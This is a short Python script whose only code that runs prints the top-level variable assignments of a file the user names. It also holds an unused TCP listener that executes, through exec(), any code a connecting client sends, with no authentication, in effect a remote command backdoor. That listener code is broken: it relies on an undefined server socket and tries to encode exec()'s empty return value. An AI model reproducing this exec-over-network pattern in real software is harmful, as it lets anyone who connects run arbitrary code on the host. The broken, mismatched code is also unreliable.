from socket import AF_INET as ipv4
from socket import SOCK_STREAM as tcp
import socket as netcom
import threading as task
import subprocess as proc
import time



def init():
    while True:
        try:
            print("listening...")
            server.listen(20)
            client, client_ip = server.accept()
            print(f"client accepted: {client_ip}")
            thread_client = task.Thread(target=client_start, args=[client])
            thread_client.start()
        except Exception as e:
            print(e)
def client_start(client):
    while True:
        try:
            ack = client.recv(3).decode("utf-8")
            print("acked")
            if not ack:
                continue
            cmd = client.recv(256).decode("utf-8")
            if cmd:
                response = exec(cmd)
            else:
                continue
            client.send(response.encode("utf-8"))
        except Exception as e:
            print(e)
            client.close()
            break

def extract_vars(path):
    with open(path, "r") as file:
        program_data = file.readlines()
        vars = {}
        i = 0
        for line in program_data:
            i += 1
            if "=" in line and "==" not in line:
                if '\t' in line or "    " in line:
                    continue
                vars.update({i: line.strip()})
        for val, item in vars.items():
            print(val, item)

path = input("enter full path for extraction\n>>>> ")
extract_vars(path)